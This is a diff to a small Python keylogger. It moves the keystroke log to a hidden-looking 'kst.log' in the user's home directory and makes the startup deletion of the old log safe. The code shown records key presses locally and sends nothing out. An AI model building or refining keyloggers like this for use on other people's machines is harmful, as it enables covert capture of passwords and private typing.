@@ -1,4 +1,5 @@
 from functools import partial
+from pathlib import Path
 import atexit
 import os
 
@@ -9,7 +10,7 @@ MAP = {
   "\r": "\n"
 }
 
-FILE_NAME = "keystrokes.log"
+FILE_NAME = "{0}/kst.log".format(str(Path.home()))
 CLEAR_ON_STARTUP = True
 TERMINATE_KEY = "f7"
 
@@ -37,7 +38,8 @@ def onexit(output):
 
 def main():
   if CLEAR_ON_STARTUP:
-    os.remove(FILE_NAME) # Delete the old file
+    if os.path.exists(FILE_NAME):
+      os.remove(FILE_NAME) # Delete the old file
   is_down = {} # Indicates if a key is being pressed
   output = open(FILE_NAME, "a") # Output file
   atexit.register(onexit, output) # Close the file at the end of the program
